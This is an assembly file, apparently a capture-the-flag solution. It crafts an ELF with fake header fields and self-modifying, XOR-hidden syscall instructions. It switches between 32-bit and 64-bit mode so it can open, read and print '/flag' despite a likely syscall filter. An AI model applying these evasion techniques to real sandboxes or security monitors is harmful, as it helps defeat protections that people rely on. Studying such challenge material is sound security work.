BITS 32

              org     0x31000

ehdr:                                                 ; Elf32_Ehdr
              db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
      times 8 db      0
              dw      2                               ;   e_type
              dw      3                               ;   e_machine
              dd      1                               ;   e_version
              dd      _start                          ;   e_entry
              dd      0x100                           ;   e_phoff
              dd      0x40                            ;   e_shoff
              dd      0                               ;   e_flags
              dw      0x40                            ;   e_ehsize
              dw      phdrsize                        ;   e_phentsize
              dw      1                               ;   e_phnum
              dw      0                               ;   e_shentsize
              dw      0                               ;   e_shnum
              dw      0                               ;   e_shstrndx

							dw 0x40  ; e_ehsize (fake)
							dw 0
							dw 1     ; e_phoff (fake)

      times 0x100 - ($-$$) db 0

phdr:                                                 ; Elf32_Phdr
              dd      1                               ;   p_type
              dd      0                               ;   p_offset
              dd      $$                              ;   p_vaddr
              dd      $$                              ;   p_paddr
              dd      filesize                        ;   p_filesz
              dd      filesize                        ;   p_memsz
              dd      7                               ;   p_flags
              dd      0x1000                          ;   p_align
phdrsize      equ     $ - phdr

times 0x337 - ($-$$) db 0
db "/flag", 0

_start:

call syscall32
syscall32:
pop eax
nop
nop

mov ebx, 0xc380cd ^ 0x111111
xor ebx, 0x111111
mov dword [syscall32], ebx

call syscall64
syscall64:
pop ebx
nop
nop

mov ebx, 0xc3050f ^ 0x111111
xor ebx, 0x111111
mov dword [syscall64], ebx

jmp 0x33:code64

BITS 64
code64:

mov rsi, 0
mov rdi, 0x31337
mov rax, 2
call syscall64

mov ebx, eax
mov ecx, esp
mov edx, 0x100
mov eax, 3
call syscall32

mov ebx, 1
mov eax, 4
call syscall32

mov ebx, 137
mov eax, 1
call syscall32

filesize      equ     $ - $$

